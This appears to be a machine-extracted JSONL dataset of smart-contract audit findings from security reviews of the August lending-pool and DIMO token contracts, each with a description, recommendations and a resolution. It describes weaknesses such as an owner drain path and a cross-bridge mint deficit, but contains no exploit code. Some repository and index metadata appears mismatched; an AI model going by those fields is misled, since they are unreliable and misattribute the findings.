"fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Impact": "Informational", "Likelihood": "Medium", "Finding ID": "AUG-09", "Target": "core/BaseOwnable.sol & pools/LendingPool.sol", "Status": "Closed: See Resolution", "Asset": "core/BaseOwnable.sol & pools/LendingPool.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-008", "doc_id": "sigmaprime_august_review", "finding_index": 8, "page_start": 16, "title": "Deviation From Common Interface Naming Convention", "short_summary": null, "description_md": "### **Description**\n\nThe interface ILenderHook deviates from common naming conventions. Typically, interfaces are named using the format I + contract name.\n\nThe contract implementing ILenderHook is named HookableLender .\n", "full_markdown": "| AUG-10 | Deviation From Common Interface Naming Convention |  |\n|--------|---------------------------------------------------|--|\n| Asset  | loans/interfaces/ILenderHook.sol                  |  |\n| Status | Resolved: See Resolution                          |  |\n| Rating | Informational                                     |  |\n\n### **Description**\n\nThe interface ILenderHook deviates from common naming conventions. Typically, interfaces are named using the format I + contract name.\n\nThe contract implementing ILenderHook is named HookableLender .\n\n#### **Recommendations**\n\nConsider renaming the interface to IHookableLender for improved clarity and adherence to standard naming practices.\n\n#### **Resolution**\n\nThe interface was renamed to IHookableLender as per the recommendation in commit [d510a02.](https://github.com/fractal-protocol/august-contracts-upgradeable/commit/d510a02b3b9932638f782bc3543564a1d8dfdf61)\n", "severity": "Informational", "difficulty": "Low", "type": null, "finding_id": "AUG-10", "target": {"path": "loans/interfaces/ILenderHook.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "e3786e63e6def6f3b71ce7b4b30906123bffe67c", "branch": null, "relative_file": "loans/interfaces/ILenderHook.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Impact": "Informational", "Likelihood": "Low", "Finding ID": "AUG-10", "Target": "loans/interfaces/ILenderHook.sol", "Status": "Resolved: See Resolution", "Asset": "loans/interfaces/ILenderHook.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-009", "doc_id": "sigmaprime_august_review", "finding_index": 9, "page_start": 17, "title": "Variable _maxSupply Is Used For Two Different Purposes", "short_summary": null, "description_md": "### **Description**\n\nThe variable \\_maxSupply is used as the return value of the function maxMint() which, according to the NatSpec comment of this function, is specified as *\"the maximum amount of the Vault shares that can be minted for the receiver, through a mint call\"*. However, this variable is also used as the maximum value of totalSupply in the function BaseUpgradeableERC20.\\_canMint() .\n", "full_markdown": "| AUG-11 | Variable _maxSupply Is Used For Two Different Purposes                        |  |\n|--------|-------------------------------------------------------------------------------|--|\n| Asset  | pools/base/BaseUpgradeableERC4626.sol and pools/base/BaseUpgradeableERC20.sol |  |\n| Status | Closed: See Resolution                                                        |  |\n| Rating | Informational                                                                 |  |\n\n### **Description**\n\nThe variable \\_maxSupply is used as the return value of the function maxMint() which, according to the NatSpec comment of this function, is specified as *\"the maximum amount of the Vault shares that can be minted for the receiver, through a mint call\"*. However, this variable is also used as the maximum value of totalSupply in the function BaseUpgradeableERC20.\\_canMint() .\n\n#### **Recommendations**\n\nTo avoid confusion, use another variable as the return value of the function maxMint() or rename the function maxMint() to maxSupply() .\n\n#### **Resolution**\n\nThe development team has decided to mark this issue as a *Won't fix*. They confirmed that the max supply is the max mint as well.\n", "severity": "Informational", "difficulty": "Low", "type": null, "finding_id": "AUG-11", "target": {"path": "pools/base/BaseUpgradeableERC4626.sol and pools/base/BaseUpgradeableERC20.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "e3786e63e6def6f3b71ce7b4b30906123bffe67c", "branch": null, "relative_file": "pools/base/BaseUpgradeableERC4626.sol and pools/base/BaseUpgradeableERC20.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Impact": "Informational", "Likelihood": "Low", "Finding ID": "AUG-11", "Target": "pools/base/BaseUpgradeableERC4626.sol and pools/base/BaseUpgradeableERC20.sol", "Status": "Closed: See Resolution", "Asset": "pools/base/BaseUpgradeableERC4626.sol and pools/base/BaseUpgradeableERC20.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-010", "doc_id": "sigmaprime_august_review", "finding_index": 10, "page_start": 18, "title": "Rogue Owner May Siphon Assets Through emergencyWithdraw()", "short_summary": null, "description_md": "### **Description**\n\nThe emergencyWithdrawal() function lacks preconditions or restrictions, allowing the owner to withdraw any tokens at will.\n\nThere is a risk to the integrity of the pool and the security of depositors' funds. Specific concerns for depositors include:\n\n- No defined conditions that constitute an \"emergency,\" giving the owner discretion to use this function at any time without justification.\n- A malicious or compromised owner exploiting this function to perform an exit scam, instantly draining all assets from the pool.\n- Undermining the trustless nature of the DeFi protocol, as depositors must rely entirely on the owner's integrity.\n\nThe contrary view is that an emergencyWithdraw() potentially allows benevolent owner to extract funds to a safe address in the event of a protocol compromise.\n", "full_markdown": "| AUG-12 | Rogue Owner May Siphon Assets Through emergencyWithdraw() |\n|--------|-----------------------------------------------------------|\n| Asset  | pools/base/OwnableLiquidityPool.sol                       |\n| Status | Closed: See Resolution                                    |\n| Rating | Informational                                             |\n\n### **Description**\n\nThe emergencyWithdrawal() function lacks preconditions or restrictions, allowing the owner to withdraw any tokens at will.\n\nThere is a risk to the integrity of the pool and the security of depositors' funds. Specific concerns for depositors include:\n\n- No defined conditions that constitute an \"emergency,\" giving the owner discretion to use this function at any time without justification.\n- A malicious or compromised owner exploiting this function to perform an exit scam, instantly draining all assets from the pool.\n- Undermining the trustless nature of the DeFi protocol, as depositors must rely entirely on the owner's integrity.\n\nThe contrary view is that an emergencyWithdraw() potentially allows benevolent owner to extract funds to a safe address in the event of a protocol compromise.\n\n## **Recommendations**\n\nEnsure the owner is a multi-signature wallet or the relevant DAO.\n\nFurthermore, consider the trade-offs between safely extracting user funds in the case of an emergency and the risk of a compromised owner address stealing funds stored in the protocol.\n\n#### **Resolution**\n\nThe development team has decided not to fix this issue as they will use a multi-sig account to call the function emergencyWithdraw() .\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "AUG-12", "target": {"path": "pools/base/OwnableLiquidityPool.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "e3786e63e6def6f3b71ce7b4b30906123bffe67c", "branch": null, "relative_file": "pools/base/OwnableLiquidityPool.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Impact": "High", "Likelihood": "High", "Finding ID": "AUG-12", "Target": "pools/base/OwnableLiquidityPool.sol", "Status": "Closed: See Resolution", "Asset": "pools/base/OwnableLiquidityPool.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-011", "doc_id": "sigmaprime_august_review", "finding_index": 11, "page_start": 19, "title": "Miscellaneous General Comments", "short_summary": null, "description_md": "#### **Description**\n\nThis section details miscellaneous findings discovered by the testing team that do not have direct security implications:\n\n#### 1. **Redundant Code Adds Minimal Impact To The Contract**\n\n#### *Related Asset(s): pools/LendingPool.sol*\n\nThe following code snippet indicates an effort to initialise the value of \\_reentrancyStatus .\n\n```\n_reentrancyStatus = _REENTRANCY_NOT_ENTERED;\n```\n\nThe variable \\_reentrancyStatus() is utilised to store a flag to identify whether reentrancy has occurred or not. The utilisation of this variable is done mainly on BaseReentrancyGuard contract.\n\nA uint256 Solidity variable would be assigned to a default value of zero and therefore, the initialisation code above is not necessary to make modifier nonReentrant of BaseReentrancyGuard contract works.\n\nThe code on line [**30**] of LendingPool contract can be safely removed.\n\n#### 2. **Inaccurate Data In Event WithdrawalRequested**\n\n#### *Related Asset(s): pools/base/TimelockedERC4626.sol*\n\nThe event emittance on line [**405**] uses assetsAmount instead of effectiveAssetsAmount . This does not conform to the NatSpec specification for event Requested on line [**51**] as follows:\n\n```\n@param assets The amount of underlying assets to transfer.\n...\nevent WithdrawalRequested (address ownerAddr, address receiverAddr, uint256 shares,\n                                uint256 assets, uint256 fee, uint256 year, uint256 month, uint256 day);\n```\n\nConsider replacing assetsAmount with effectiveAssetsAmount .\n\n#### 3. **Duplicate Code Present In Notifying Loans**\n\n#### *Related Asset(s): pools/base/HookableLender.sol*\n\nThe functions notifyLoanMatured() , notifyLoanClosed() and notifyPrincipalRepayment() in the HookableLender contract are nearly identical. While these functions perform the same operations, they serve distinct semantic purposes in the contract's logic. However, code duplication should be minimised as much as possible.\n\nTo reduce code duplication while maintaining semantic clarity, consider implementing an internal function containing the shared logic.\n\n#### 4. **Out Of Place Function**\n\n#### *Related Asset(s): pools/base/BaseLendingPool.sol*\n\nThe collectFees() function in BaseLendingPool appears to be out of place:\n\n\n```\nfunction collectFees() external onlyIfInitialized nonReentrant ifConfigured onlyOwner {\n    require(feesCollector != address(0), \"Fee collector not set\");\n    require(totalCollectableFees > 0, \"No fees to collect\");\n    _collectFees();\n}\n```\n\nThis function calls \\_collectFees() , which is likely inherited from TimelockedERC4626 . These fees are typically associated with user redemptions of deposits, rather than being directly related to loan operations. Its presence in a contract focused on loan deployment and management may lead to confusion about the source and nature of these fees.\n\nConsider moving this function to a more appropriate contract that deals with user deposits and withdrawals, or clearly document its purpose and fee source in the contract.\n\n#### 5. **Redundant Code And Unnecessary Conditional Structure**\n\n#### *Related Asset(s): pools/LendingPool.sol*\n\nThe current implementation of updateTimelockDuration contains redundant code and a potentially unnecessary conditional structure:\n\n```\nif (newDuration > lagDuration) {\n    lagDuration = newDuration;\n} else {\n    require(globalLiabilityShares == 0, \"Process claims first\");\n    lagDuration = newDuration;\n}\n```\n\nRefactor the code to remove duplication and improve readability:\n\n```\nif (newDuration < lagDuration) {\n    require(globalLiabilityShares == 0, \"Process claims first\");\n}\nlagDuration = newDuration;\n```\n\n#### 6. **Contract Contains Commented-Out Code**\n\n#### *Related Asset(s): pools/LendingPool.sol*\n\nThe updateTimelockDuration function in the LendingPool contract contains commented-out code:\n\n```\n//require(newDuration >= 2 hours, \"Timelock too short\");\n```\n\nRemove the commented-out code. If this check is no longer needed, it should be deleted entirely. If it might be required in the future, document the rationale in a comment or move it to development notes outside the contract.\n\n#### 7. **Unnecessary onlyIfInitialized Modifier**\n\n#### *Related Asset(s): src/\\*.sol*\n\nThe use of the onlyIfInitialized modifier in functions that have the modifier ifConfig is unnecessary and leads to more gas consumption. This is because the function configurePool() has the modifier onlyIfInitialized .\n\nRemove the modifier onlyIfInitialized from the functions that have ifConfig .\n", "full_markdown": "| AUG-13 | Miscellaneous General Comments |\n|--------|--------------------------------|\n| Asset  | All contracts                  |\n| Status | Resolved: See Resolution       |\n| Rating | Informational                  |\n\n#### **Description**\n\nThis section details miscellaneous findings discovered by the testing team that do not have direct security implications:\n\n#### 1. **Redundant Code Adds Minimal Impact To The Contract**\n\n#### *Related Asset(s): pools/LendingPool.sol*\n\nThe following code snippet indicates an effort to initialise the value of \\_reentrancyStatus .\n\n```\n_reentrancyStatus = _REENTRANCY_NOT_ENTERED;\n```\n\nThe variable \\_reentrancyStatus() is utilised to store a flag to identify whether reentrancy has occurred or not. The utilisation of this variable is done mainly on BaseReentrancyGuard contract.\n\nA uint256 Solidity variable would be assigned to a default value of zero and therefore, the initialisation code above is not necessary to make modifier nonReentrant of BaseReentrancyGuard contract works.\n\nThe code on line [**30**] of LendingPool contract can be safely removed.\n\n#### 2. **Inaccurate Data In Event WithdrawalRequested**\n\n#### *Related Asset(s): pools/base/TimelockedERC4626.sol*\n\nThe event emittance on line [**405**] uses assetsAmount instead of effectiveAssetsAmount . This does not conform to the NatSpec specification for event Requested on line [**51**] as follows:\n\n```\n@param assets The amount of underlying assets to transfer.\n...\nevent WithdrawalRequested (address ownerAddr, address receiverAddr, uint256 shares,\n                                uint256 assets, uint256 fee, uint256 year, uint256 month, uint256 day);\n```\n\nConsider replacing assetsAmount with effectiveAssetsAmount .\n\n#### 3. **Duplicate Code Present In Notifying Loans**\n\n#### *Related Asset(s): pools/base/HookableLender.sol*\n\nThe functions notifyLoanMatured() , notifyLoanClosed() and notifyPrincipalRepayment() in the HookableLender contract are nearly identical. While these functions perform the same operations, they serve distinct semantic purposes in the contract's logic. However, code duplication should be minimised as much as possible.\n\nTo reduce code duplication while maintaining semantic clarity, consider implementing an internal function containing the shared logic.\n\n#### 4. **Out Of Place Function**\n\n#### *Related Asset(s): pools/base/BaseLendingPool.sol*\n\nThe collectFees() function in BaseLendingPool appears to be out of place:\n\n\n```\nfunction collectFees() external onlyIfInitialized nonReentrant ifConfigured onlyOwner {\n    require(feesCollector != address(0), \"Fee collector not set\");\n    require(totalCollectableFees > 0, \"No fees to collect\");\n    _collectFees();\n}\n```\n\nThis function calls \\_collectFees() , which is likely inherited from TimelockedERC4626 . These fees are typically associated with user redemptions of deposits, rather than being directly related to loan operations. Its presence in a contract focused on loan deployment and management may lead to confusion about the source and nature of these fees.\n\nConsider moving this function to a more appropriate contract that deals with user deposits and withdrawals, or clearly document its purpose and fee source in the contract.\n\n#### 5. **Redundant Code And Unnecessary Conditional Structure**\n\n#### *Related Asset(s): pools/LendingPool.sol*\n\nThe current implementation of updateTimelockDuration contains redundant code and a potentially unnecessary conditional structure:\n\n```\nif (newDuration > lagDuration) {\n    lagDuration = newDuration;\n} else {\n    require(globalLiabilityShares == 0, \"Process claims first\");\n    lagDuration = newDuration;\n}\n```\n\nRefactor the code to remove duplication and improve readability:\n\n```\nif (newDuration < lagDuration) {\n    require(globalLiabilityShares == 0, \"Process claims first\");\n}\nlagDuration = newDuration;\n```\n\n#### 6. **Contract Contains Commented-Out Code**\n\n#### *Related Asset(s): pools/LendingPool.sol*\n\nThe updateTimelockDuration function in the LendingPool contract contains commented-out code:\n\n```\n//require(newDuration >= 2 hours, \"Timelock too short\");\n```\n\nRemove the commented-out code. If this check is no longer needed, it should be deleted entirely. If it might be required in the future, document the rationale in a comment or move it to development notes outside the contract.\n\n#### 7. **Unnecessary onlyIfInitialized Modifier**\n\n#### *Related Asset(s): src/\\*.sol*\n\nThe use of the onlyIfInitialized modifier in functions that have the modifier ifConfig is unnecessary and leads to more gas consumption. This is because the function configurePool() has the modifier onlyIfInitialized .\n\nRemove the modifier onlyIfInitialized from the functions that have ifConfig .\n\n## **Recommendations**\n\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.\n\n\n# **Resolution**\n\nThe development team's responses to the raised issues above are as follows.\n\n1. The issue was resolved as suggested. The initialisation of the variable \\_reentrancyStatus is removed.\n\n- 2. The issue was acknowledged by the development team as the effective amount can be calculated offchain assetsAmount - applicableFee .\n- 3. The issue was acknowledged by the development team as the internal function will increase the contract's code size.\n- 4. The issue was resolved by removing the function \\_collectFees() from the contract TimelockedERC4626 . The external function collectFees is updated accordingly.\n- 5. The code was refactored as suggested.\n- 6. The code was removed as suggested.\n- 7. The issue was resolved as suggested by removing the modifier onlyIfInitialized .\n\n\nAugust Vault Test Suite\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "e3786e63e6def6f3b71ce7b4b30906123bffe67c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Impact": "Informational", "Likelihood": null, "Finding ID": null, "Target": null, "Status": "Resolved: See Resolution", "Asset": "All contracts"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-001", "doc_id": "sigmaprime_dimo_review", "finding_index": 1, "page_start": 6, "title": "Removal of ERC20VotesUpgradeable Might Allow Double Voting", "short_summary": null, "description_md": "#### **Description**\n\nBecause it was not possible to run a governance propose/vote test, this vulnerability could not be further investigated, however it is a concern that OpenZeppelin's ERC20VotesUpgradeable contract was removed between this version of the token and its predecessor.\n\nTo quote OpenZeppelin's Documentation:\n\n*\"This extension will keep track of historical balances so that voting power is retrieved from past snapshots rather than current balance, which is an important protection that prevents double voting.\"*\n", "full_markdown": "| DMO-01 | Removal of ERC20VotesUpgradeable Might Allow Double Voting |              |                    |\n|--------|------------------------------------------------------------|--------------|--------------------|\n| Asset  | DimoV2.sol                                                 |              |                    |\n| Status | Closed: See Resolution                                     |              |                    |\n| Rating | Severity: High                                             | Impact: High | Likelihood: Medium |\n\n#### **Description**\n\nBecause it was not possible to run a governance propose/vote test, this vulnerability could not be further investigated, however it is a concern that OpenZeppelin's ERC20VotesUpgradeable contract was removed between this version of the token and its predecessor.\n\nTo quote OpenZeppelin's Documentation:\n\n*\"This extension will keep track of historical balances so that voting power is retrieved from past snapshots rather than current balance, which is an important protection that prevents double voting.\"*\n\n#### **Recommendations**\n\nBe aware of this issue and ensure that double vote counting is not possible with the protocol's new governance implementation.\n\n#### **Resolution**\n\nAfter communication with the development team, it has been determined that the governance functionality of the DIMO token is out of scope of this audit. This feature is in active development and therefore related issues have been closed. As the governance functionality is out of scope, the testing team cannot attest to the security of this system. The testing team acknowledges that the development team is still moving forward based on recommendations provided in this issue.\n", "severity": "High", "difficulty": "High", "type": null, "finding_id": "DMO-01", "target": {"path": "DimoV2.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-token", "org": "DIMO-Network", "name": "dimo-token", "commit": "ea6729ec14ea13146242b6165c6d5eaf9fb95e0d", "branch": null, "relative_file": "DimoV2.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Finding ID": "DMO-01", "Target": "DimoV2.sol", "Status": "Closed: See Resolution", "Asset": "DimoV2.sol", "Rating": "Severity: High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-002", "doc_id": "sigmaprime_dimo_review", "finding_index": 2, "page_start": 7, "title": "Token mint() Produces Conflicts Across Bridges", "short_summary": null, "description_md": "## **Description**\n\nThe Polygon child token contract (also called Dimo.sol ) has both a deposit() function for the Polygon bridge, but also a mint() function. As the main token is on the Ethereum blockchain, the purpose of this child token is to serve as a bridged representation of the Ethereum Mainnet token on Polygon.\n\nHowever, this function is incompatible due to the capacity to mint tokens on Polygon that do not correspond to tokens on the Ethereum Mainnet.\n\nConsider this simplified scenario involving a situation where no tokens have been bridged to Polygon:\n\n- 1. Alice uses the Polygon bridge to bridge 1,000 DIMO tokens to Polygon from the Ethereum Mainnet. She receives 1,000 child tokens and her original tokens are locked in the bridge.\n- 2. MINTER\\_ROLE is able to call mint() on the child token contract. He receives 1,000 child tokens on Polygon.\n- 3. MINTER\\_ROLE bridges his tokens back to Ethereum Mainnet, and receives the 1,000 DIMO tokens locked by Alice.\n- 4. Alice attempts to bridge back to Mainnet. There are no tokens available in the Polygon bridge resulting in a net deficit.\n", "full_markdown": "| DMO-02 | Token mint() Produces Conflicts Across Bridges |  |  |\n|--------|------------------------------------------------|--|--|\n| Asset  | Dimo.sol                                       |  |  |\n| Status | Resolved: See Resolution                       |  |  |\n| Rating | Informational                                  |  |  |\n\n## **Description**\n\nThe Polygon child token contract (also called Dimo.sol ) has both a deposit() function for the Polygon bridge, but also a mint() function. As the main token is on the Ethereum blockchain, the purpose of this child token is to serve as a bridged representation of the Ethereum Mainnet token on Polygon.\n\nHowever, this function is incompatible due to the capacity to mint tokens on Polygon that do not correspond to tokens on the Ethereum Mainnet.\n\nConsider this simplified scenario involving a situation where no tokens have been bridged to Polygon:\n\n- 1. Alice uses the Polygon bridge to bridge 1,000 DIMO tokens to Polygon from the Ethereum Mainnet. She receives 1,000 child tokens and her original tokens are locked in the bridge.\n- 2. MINTER\\_ROLE is able to call mint() on the child token contract. He receives 1,000 child tokens on Polygon.\n- 3. MINTER\\_ROLE bridges his tokens back to Ethereum Mainnet, and receives the 1,000 DIMO tokens locked by Alice.\n- 4. Alice attempts to bridge back to Mainnet. There are no tokens available in the Polygon bridge resulting in a net deficit.\n\n#### **Recommendations**\n\nRemove the function mint() from the child token.\n\n# **Resolution**\n\nAfter discussion with the development team, this issue has been deemed inapplicable/irrelevant as far as security risks are concerned. Polygon documentation references the requirement for mintable assets in their documentation [here.](https://wiki.polygon.technology/docs/develop/ethereum-polygon/mintable-assets/) We have lowered the severity to informational as total token supply is split across ethereum and polygon chains in a manner that might be confusing. With a solely ETH minted asset, its total supply would always be canonical.\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "DMO-02", "target": {"path": "Dimo.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-token", "org": "DIMO-Network", "name": "dimo-token", "commit": "ea6729ec14ea13146242b6165c6d5eaf9fb95e0d", "branch": null, "relative_file": "Dimo.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Finding ID": "DMO-02", "Target": "Dimo.sol", "Status": "Resolved: See Resolution", "Asset": "Dimo.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-003", "doc_id": "sigmaprime_dimo_review", "finding_index": 3, "page_start": 8, "title": "Voting Process Reverts", "short_summary": null, "description_md": "## **Description**\n\nBecause of the removal of OpenZeppelin's ERC20VotesUpgradeable contract from the Dimo token in DimoV2.sol , it is not possible to propose a governance vote.\n\nCalls to DimoGovernance.propose() revert because propose() calls token.getPastVotes(account, blockNumber) .\n", "full_markdown": "| DMO-03 | Voting Process Reverts       |                |                    |\n|--------|------------------------------|----------------|--------------------|\n| Asset  | DimoV2.sol, DimoGovernor.sol |                |                    |\n| Status | Closed: See Resolution       |                |                    |\n| Rating | Severity: Medium             | Impact: Medium | Likelihood: Medium |\n\n## **Description**\n\nBecause of the removal of OpenZeppelin's ERC20VotesUpgradeable contract from the Dimo token in DimoV2.sol , it is not possible to propose a governance vote.\n\nCalls to DimoGovernance.propose() revert because propose() calls token.getPastVotes(account, blockNumber) .\n\n## **Recommendations**\n\nModify DimoV2 to reimplement OpenZeppelin's ERC20VotesUpgradeable .\n\n#### **Resolution**\n\nAfter communication with the development team, it has been determined that the governance functionality of the DIMO token is out of scope of this audit. This feature is in active development and therefore related issues have been closed. As the governance functionality is out of scope, the testing team cannot attest to the security of this system. The testing team acknowledges that the development team is still moving forward based on recommendations provided in this issue.\n", "severity": "Medium", "difficulty": "High", "type": null, "finding_id": "DMO-03", "target": {"path": "DimoV2.sol, DimoGovernor.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-token", "org": "DIMO-Network", "name": "dimo-token", "commit": "ea6729ec14ea13146242b6165c6d5eaf9fb95e0d", "branch": null, "relative_file": "DimoV2.sol, DimoGovernor.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Finding ID": "DMO-03", "Target": "DimoV2.sol, DimoGovernor.sol", "Status": "Closed: See Resolution", "Asset": "DimoV2.sol, DimoGovernor.sol", "Rating": "Severity: Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-004", "doc_id": "sigmaprime_dimo_review", "finding_index": 4, "page_start": 9, "title": "Function Signature Collision Creates Inaccessible Codeblocks", "short_summary": null, "description_md": "#### **Description**\n\nWhen new modules are added in \\_addModule() , their function signatures are checked against s.implementations[selectors[i]] on line [**129**] to ensure that the same function signature is not added twice. However, there is no check against the existing function signatures of DIMORegistry .\n\nWith the selection of modules as per the installation script, this situation does occur and several functions in the modules are installed but inaccessible because they are blocked by function signatures already present in DIMORegistry :\n\n- Getter.ownerOf() is shadowed and blocked by ERC721Base.ownerOf() .\n- Getter.name() is shadowed and blocked by ERC721Metadata.name() .\n- Getter.symbol() is shadowed and blocked by ERC721Metadata.symbol() .\n- Getter.tokenURI() is shadowed and blocked by ERC721Metadata.tokenURI() .\n\nThese shadowed functions, and any future shadowed functions, are inaccessible. This may have security implications if the team develop functionality on the assumption that one version of a function is being called, when in fact it is another.\n\nThe risk increases as more modules are added and the complexity of the system grows.\n", "full_markdown": "| DMO-04 | Function Signature Collision Creates Inaccessible Codeblocks |                |                    |\n|--------|--------------------------------------------------------------|----------------|--------------------|\n| Asset  | DIMORegistry.sol                                             |                |                    |\n| Status | Resolved: See Resolution                                     |                |                    |\n| Rating | Severity: Medium                                             | Impact: Medium | Likelihood: Medium |\n\n#### **Description**\n\nWhen new modules are added in \\_addModule() , their function signatures are checked against s.implementations[selectors[i]] on line [**129**] to ensure that the same function signature is not added twice. However, there is no check against the existing function signatures of DIMORegistry .\n\nWith the selection of modules as per the installation script, this situation does occur and several functions in the modules are installed but inaccessible because they are blocked by function signatures already present in DIMORegistry :\n\n- Getter.ownerOf() is shadowed and blocked by ERC721Base.ownerOf() .\n- Getter.name() is shadowed and blocked by ERC721Metadata.name() .\n- Getter.symbol() is shadowed and blocked by ERC721Metadata.symbol() .\n- Getter.tokenURI() is shadowed and blocked by ERC721Metadata.tokenURI() .\n\nThese shadowed functions, and any future shadowed functions, are inaccessible. This may have security implications if the team develop functionality on the assumption that one version of a function is being 